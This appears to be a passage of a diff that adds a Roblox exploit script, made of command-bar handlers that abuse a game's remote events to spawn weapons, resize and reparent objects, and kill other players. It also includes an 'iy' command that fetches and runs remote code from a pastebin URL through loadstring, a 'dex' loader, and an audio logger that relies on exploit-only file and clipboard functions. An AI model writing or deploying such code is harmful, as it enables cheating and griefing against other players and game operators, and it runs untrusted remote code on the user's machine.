+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-35.084))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.2, -0.2, 0.2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+	if string.sub(cmdbar.Text,1,4) == "cube"  or string.sub(cmdbar.Text,1,5) == prefix.."cube" then 
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 1107038050, 1587542316
+local Name, ToolTip = "BOOMER", "Sexy"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://1107038050")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://1587542316")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(2000,2000,2000))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-35.084))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.2, -0.2, 0.2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+	if string.sub(cmdbar.Text,1,6) == "deagle" or string.sub(cmdbar.Text,1,7) == prefix.."deagle" then 
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 602885639, 1587542316
+local Name, ToolTip = "BOOMER", "Hot ass pistol"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://602885639")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://1587542316")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(.4,.4,.4))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-35.084))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.2, -0.2, 0.2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+	if string.sub(cmdbar.Text,1,2) == "kp" or string.sub(cmdbar.Text,1,3) == prefix.."kp" then 
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 430286890, 430286895
+local Name, ToolTip = "BOOMER", "Krabby Patty"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://430286890")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://430286895")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(.12,.12,.12))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-35.084))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.2, -0.2, 0.2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+	if string.sub(cmdbar.Text,1,2) == "iy" or string.sub(cmdbar.Text,1,3) == prefix.."iy" then
+		loadstring(game:HttpGet("https://pastebin.com/raw/tzTXmYf2", true))()
+	end
+	
+	if string.sub(cmdbar.Text,1,5) == "audio" or string.sub(cmdbar.Text,1,6) == prefix.."audio" then
+aa = game:GetObjects("rbxassetid://01997056190")[1]
+aa.Parent = game.CoreGui
+wait(0.2)
+GUI = aa.PopupFrame.PopupFrame
+pos = 0
+
+ignore = {
+"rbxasset://sounds/action_get_up.mp3",
+"rbxasset://sounds/uuhhh.mp3",
+"rbxasset://sounds/action_falling.mp3",
+"rbxasset://sounds/action_jump.mp3",
+"rbxasset://sounds/action_jump_land.mp3",
+"rbxasset://sounds/impact_water.mp3",
+"rbxasset://sounds/action_swim.mp3",
+"rbxasset://sounds/action_footsteps_plastic.mp3"
+}
+
+GUI.Close.MouseButton1Click:connect(function()
+GUI:TweenSize(UDim2.new(0, 360, 0, 0),"Out","Quad",0.5,true) wait(0.6)
+GUI.Parent:TweenSize(UDim2.new(0, 0, 0, 20),"Out","Quad",0.5,true) wait(0.6)
+aa:Destroy()
+end)
+
+local min = false
+GUI.Minimize.MouseButton1Click:connect(function()
+if min == false then
+GUI:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) min = true
+else
+GUI:TweenSize(UDim2.new(0, 360, 0, 260),"Out","Quad",0.5,true) min = false
+end
+end)
+
+function printTable(tbl)
+if type(tbl) ~= 'table' then return nil end
+local depthCount = -15
+
+local function run(val, inPrefix)
+depthCount = depthCount + 15
+-- if inPrefix then print(string.rep(' ', depthCount) .. '{') end
+for i,v in pairs(val) do
+if type(v) == 'table' then
+-- print(string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = {')
+GUI.Store.Text = GUI.Store.Text..'\n'..string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = {'
+run(v, false)
+wait()
+else
+-- print(string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = ' .. tostring(v))
+GUI.Store.Text = GUI.Store.Text..'\n'..string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = ' .. tostring(v)
+wait()
+end
+end
+-- print(string.rep(' ', depthCount) .. '}')
+depthCount = depthCount - 15
+end
+run(tbl, true)
+end
+
+function refreshlist()
+pos = 0
+GUI.Logs.CanvasSize = UDim2.new(0,0,0,0)
+for i,v in pairs(GUI.Logs:GetChildren()) do
+v.Position = UDim2.new(0,0,0, pos)
+GUI.Logs.CanvasSize = UDim2.new(0,0,0, pos+20)
+pos = pos+20
+end
+end
+
+function FindTable(Table, Name)
+for i,v in pairs(Table) do
+if v == Name then
+return true
+end end
+return false
+end
+
+function writefileExploit()
+if writefile then
+return true
+end
+end
+
+writeaudio = {}
+running = false
+GUI.SS.MouseButton1Click:connect(function()
+if writefileExploit() then
+if running == false then
+GUI.Load.Visible = true running = true
+GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) wait(0.3)
+for _, child in pairs(GUI.Logs:GetChildren()) do
+if child:FindFirstChild('ImageButton') then local bttn = child:FindFirstChild('ImageButton')
+if bttn.BackgroundTransparency == 0 then
+writeaudio[#writeaudio + 1] = {NAME = child.NAME.Value, ID = child.ID.Value}
+end
+end
+end
+GUI.Store.Visible = true
+printTable(writeaudio)
+wait(0.2)
+local filename = 0
+local function write()
+local file
+pcall(function() file = readfile("Audios"..filename..".txt") end)
+if file then
+filename = filename+1
+write()
+else
+local text = tostring(GUI.Store.Text)
+text = text:gsub('\n', '\r\n')
+writefile("Audios"..filename..".txt", text)
+end
+end
+write()
+for rep = 1,10 do
+GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
+wait(0.05)
+end
+GUI.Load.Visible = false
+GUI.Load.BackgroundTransparency = 0
+GUI.Load.Size = UDim2.new(0, 0, 0, 20)
+running = false
+GUI.Store.Visible = false
+GUI.Store.Text = ''
+writeaudio = {}
+game:FindService('StarterGui'):SetCore('SendNotification', {
+Title = 'Audio Logger',
+Text = 'Saved audios\n(Audios'..filename..'.txt)',
+Icon = 'http://www.roblox.com/asset/?id=176572847',
+Duration = 5,
+})
+end
+else
+game:FindService('StarterGui'):SetCore('SendNotification', {
+Title = 'Audio Logger',
+Text = 'Exploit cannot writefile :(',
+Icon = 'http://www.roblox.com/asset/?id=176572847',
+Duration = 5,
+})
+end
+end)
+
+GUI.SA.MouseButton1Click:connect(function()
+if writefileExploit() then
+if running == false then
+GUI.Load.Visible = true running = true
+GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) wait(0.3)
+for _, child in pairs(GUI.Logs:GetChildren()) do
+writeaudio[#writeaudio + 1] = {NAME = child.NAME.Value, ID = child.ID.Value}
+end
+GUI.Store.Visible = true
+printTable(writeaudio)
+wait(0.2)
+local filename = 0
+local function write()
+local file
+pcall(function() file = readfile("Audios"..filename..".txt") end)
+if file then
+filename = filename+1
+write()
+else
+local text = tostring(GUI.Store.Text)
+text = text:gsub('\n', '\r\n')
+writefile("Audios"..filename..".txt", text)
+end
+end
+write()
+for rep = 1,10 do
+GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
+wait(0.05)
+end
+GUI.Load.Visible = false
+GUI.Load.BackgroundTransparency = 0
+GUI.Load.Size = UDim2.new(0, 0, 0, 20)
+running = false
+GUI.Store.Visible = false
+GUI.Store.Text = ''
+writeaudio = {}
+game:FindService('StarterGui'):SetCore('SendNotification', {
+Title = 'Audio Logger',
+Text = 'Saved audios\n(Audios'..filename..'.txt)',
+Icon = 'http://www.roblox.com/asset/?id=176572847',
+Duration = 5,
+})
+end
+else
+game:FindService('StarterGui'):SetCore('SendNotification', {
+Title = 'Audio Logger',
+Text = 'Exploit cannot writefile :(',
+Icon = 'http://www.roblox.com/asset/?id=176572847',
+Duration = 5,
+})
+end
+end)
+
+selectedaudio = nil
+function getaudio(place)
+if running == false then
+GUI.Load.Visible = true running = true
+GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) wait(0.3)
+for _, child in pairs(place:GetDescendants()) do
+spawn(function()
+if child:IsA("Sound") and not GUI.Logs:FindFirstChild(child.SoundId) and not FindTable(ignore,child.SoundId) then
+local id = string.match(child.SoundId, "rbxasset://sounds.+") or string.match(child.SoundId, "&hash=.+") or string.match(child.SoundId, "%d+")
+if id ~= nil then
+local newsound = GUI.Audio:Clone()
+if string.sub(id, 1, 6) == "&hash=" or string.sub(id, 1, 7) == "&0hash=" then
+id = string.sub(id, (string.sub(id, 1, 6) == "&hash=" and 7) or (string.sub(id, 1, 7) == "&0hash=" and 8), string.len(id))
+newsound.ImageButton.Image = 'rbxassetid://1453863294'
+end
+newsound.Parent = GUI.Logs
+newsound.Name = child.SoundId
+newsound.Visible = true
+newsound.Position = UDim2.new(0,0,0, pos)
+GUI.Logs.CanvasSize = UDim2.new(0,0,0, pos+20)
+pos = pos+20
+local function findname()
+Asset = game:GetService("MarketplaceService"):GetProductInfo(id)
+end
+local audioname = 'error'
+local success, message = pcall(findname)
+if success then
+    newsound.TextLabel.Text = Asset.Name
+audioname = Asset.Name
+else
+newsound.TextLabel.Text = child.Name
+audioname = child.Name
+end
+local data = Instance.new('StringValue') data.Parent = newsound data.Value = child.SoundId data.Name = 'ID'
+local data2 = Instance.new('StringValue') data2.Parent = newsound data2.Value = audioname data2.Name = 'NAME'
+local soundselected = false
+newsound.ImageButton.MouseButton1Click:Connect(function()
+if GUI.Info.Visible ~= true then
+if soundselected == false then soundselected = true
+newsound.ImageButton.BackgroundTransparency = 0
+else soundselected = false
+newsound.ImageButton.BackgroundTransparency = 1
+end
+end
+end)
+newsound.Click.MouseButton1Click:Connect(function()
+if GUI.Info.Visible ~= true then
+GUI.Info.TextLabel.Text = "Name: " ..audioname.. "\n\nID: " .. child.SoundId .. "\n\nWorkspace Name: " .. child.Name
+selectedaudio = child.SoundId
+GUI.Info.Visible = true
+end
+end)
+end
+end
+end)
+end
+end
+for rep = 1,10 do
+GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
+wait(0.05)
+end
+GUI.Load.Visible = false
+GUI.Load.BackgroundTransparency = 0
+GUI.Load.Size = UDim2.new(0, 0, 0, 20)
+running = false
+end
+
+GUI.All.MouseButton1Click:connect(function() getaudio(game)end)
+GUI.Workspace.MouseButton1Click:connect(function() getaudio(workspace)end)
+GUI.Lighting.MouseButton1Click:connect(function() getaudio(game:GetService('Lighting'))end)
+GUI.SoundS.MouseButton1Click:connect(function() getaudio(game:GetService('SoundService'))end)
+GUI.Clr.MouseButton1Click:connect(function()
+for _, child in pairs(GUI.Logs:GetChildren()) do
+if child:FindFirstChild('ImageButton') then local bttn = child:FindFirstChild('ImageButton')
+if bttn.BackgroundTransparency == 1 then
+bttn.Parent:Destroy()
+refreshlist()
+end
+end
+end
+end)
+GUI.ClrS.MouseButton1Click:connect(function()
+for _, child in pairs(GUI.Logs:GetChildren()) do
+if child:FindFirstChild('ImageButton') then local bttn = child:FindFirstChild('ImageButton')
+if bttn.BackgroundTransparency == 0 then
+bttn.Parent:Destroy()
+refreshlist()
+end
+end
+end
+end)
+autoscan = false
+GUI.AutoScan.MouseButton1Click:connect(function()
+if autoscan == false then autoscan = true
+GUI.AutoScan.BackgroundTransparency = 0.5
+game:FindService('StarterGui'):SetCore('SendNotification', {
+Title = 'Audio Logger',
+Text = 'Auto Scan ENABLED',
+Icon = 'http://www.roblox.com/asset/?id=176572847',
+Duration = 5,
+})
+else autoscan = false
+GUI.AutoScan.BackgroundTransparency = 0
+game:FindService('StarterGui'):SetCore('SendNotification', {
+Title = 'Audio Logger',
+Text = 'Auto Scan DISABLED',
+Icon = 'http://www.roblox.com/asset/?id=176572847',
+Duration = 5,
+})
+end
+end)
+
+game.DescendantAdded:connect(function(added)
+wait()
+if autoscan == true and added:IsA('Sound') and not GUI.Logs:FindFirstChild(added.SoundId) and not FindTable(ignore,added.SoundId) then
+local id = string.match(added.SoundId, "rbxasset://sounds.+") or string.match(added.SoundId, "&hash=.+") or string.match(added.SoundId, "%d+")
+if id ~= nil then
+local newsound = GUI.Audio:Clone()
+if string.sub(id, 1, 6) == "&hash=" or string.sub(id, 1, 7) == "&0hash=" then
+id = string.sub(id, (string.sub(id, 1, 6) == "&hash=" and 7) or (string.sub(id, 1, 7) == "&0hash=" and 8), string.len(id))
+newsound.ImageButton.Image = 'rbxassetid://1453863294'
+end
+local scrolldown = false
+newsound.Parent = GUI.Logs
+newsound.Name = added.SoundId
+newsound.Visible = true
+newsound.Position = UDim2.new(0,0,0, pos)
+if GUI.Logs.CanvasPosition.Y == GUI.Logs.CanvasSize.Y.Offset - 230 then
+scrolldown = true
+end
+GUI.Logs.CanvasSize = UDim2.new(0,0,0, pos+20)
+pos = pos+20
+local function findname()
+Asset = game:GetService("MarketplaceService"):GetProductInfo(id)
+end
+local audioname = 'error'
+local success, message = pcall(findname)
+if success then
+    newsound.TextLabel.Text = Asset.Name
+audioname = Asset.Name
+else
+newsound.TextLabel.Text = added.Name
+audioname = added.Name
+end
+local data = Instance.new('StringValue') data.Parent = newsound data.Value = added.SoundId data.Name = 'ID'
+local data2 = Instance.new('StringValue') data2.Parent = newsound data2.Value = audioname data2.Name = 'NAME'
+local soundselected = false
+newsound.ImageButton.MouseButton1Click:Connect(function()
+if GUI.Info.Visible ~= true then
+if soundselected == false then soundselected = true
+newsound.ImageButton.BackgroundTransparency = 0
+else soundselected = false
+newsound.ImageButton.BackgroundTransparency = 1
+end
+end
+end)
+newsound.Click.MouseButton1Click:Connect(function()
+if GUI.Info.Visible ~= true then
+GUI.Info.TextLabel.Text = "Name: " ..audioname.. "\n\nID: " .. added.SoundId .. "\n\nWorkspace Name: " .. added.Name
+selectedaudio = added.SoundId
+GUI.Info.Visible = true
+end
+end)
+--230'
+if scrolldown == true then
+GUI.Logs.CanvasPosition = Vector2.new(0, 9999999999999999999999999999999999999999999, 0, 0)
+end
+end
+end
+end)
+
+GUI.Info.Copy.MouseButton1Click:Connect(function()
+if pcall(function() Synapse:Copy(selectedaudio) end) then
+else
+local clip = setclipboard or Clipboard.set
+clip(selectedaudio)
+end
+game:FindService('StarterGui'):SetCore('SendNotification', {
+Title = 'Audio Logger',
+Text = 'Copied to clipboard',
+Icon = 'http://www.roblox.com/asset/?id=176572847',
+Duration = 5,
+})
+end)
+
+GUI.Info.Close.MouseButton1Click:Connect(function()
+GUI.Info.Visible = false
+for _, sound in pairs(game:GetService('Players').LocalPlayer.PlayerGui:GetChildren()) do
+if sound.Name == 'SampleSound' then
+sound:Destroy()
+end
+end
+GUI.Info.Listen.Text = 'Listen'
+end)
+
+GUI.Info.Listen.MouseButton1Click:Connect(function()
+if GUI.Info.Listen.Text == 'Listen' then
+local samplesound = Instance.new('Sound') samplesound.Parent = game:GetService('Players').LocalPlayer.PlayerGui
+samplesound.Looped = true samplesound.SoundId = selectedaudio samplesound:Play() samplesound.Name = 'SampleSound'
+samplesound.Volume = 5
+GUI.Info.Listen.Text = 'Stop'
+else
+for _, sound in pairs(game:GetService('Players').LocalPlayer.PlayerGui:GetChildren()) do
+if sound.Name == 'SampleSound' then
+sound:Destroy()
+end
+end
+GUI.Info.Listen.Text = 'Listen'
+end
+end)
+
+function drag(gui)
+spawn(function()
+local UserInputService = game:GetService("UserInputService")
+local dragging
+local dragInput
+local dragStart
+local startPos
+local function update(input)
+local delta = input.Position - dragStart
+gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), "InOut", "Quart", 0.04, true, nil)
+end
+gui.InputBegan:Connect(function(input)
+if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+dragging = true
+dragStart = input.Position
+startPos = gui.Position
+input.Changed:Connect(function()
+           if input.UserInputState == Enum.UserInputState.End then
+               dragging = false
+           end
+       end)
+   end
+end)
+gui.InputChanged:Connect(function(input)
+   if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+       dragInput = input
+   end
+end)
+UserInputService.InputChanged:Connect(function(input)
+   if input == dragInput and dragging then
+       update(input)
+   end
+end)
+end)
+end
+drag(aa.PopupFrame)
+	end
+
+	if string.sub(cmdbar.Text,1,3) == "dex" or string.sub(cmdbar.Text,1,4) == prefix.."dex" then
+		loadstring(game:GetObjects("rbxassetid://418957341")[1].Source)()
+	end
+
+	if string.sub(cmdbar.Text,1,9) == "baseplate" or string.sub(cmdbar.Text,1,10) == prefix.."baseplate" then
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local mesh = 1107038050
+local texture = 4455434349 
+local CE = {}
+local Variables = {
+    workspace = game:GetService("Workspace"),
+    players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Anchored",true)
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"BrickColor",BrickColor.new(0, 0, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Position",Vector3.new(-55.3984, 3966.43, 440.799))
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Rotation",Vector3.new(0,0,0))
+wait(.01)
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Size",Vector3.new(3000,3000,3000))
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Parent",Workspace)
+end
+
+ 	if string.sub(cmdbar.Text,1,3) == "mpk" or string.sub(cmdbar.Text,1,4) == prefix.."mpk" then
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 568634722, 1587542316
+local Name, ToolTip = "BOOMER", "MP5K"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
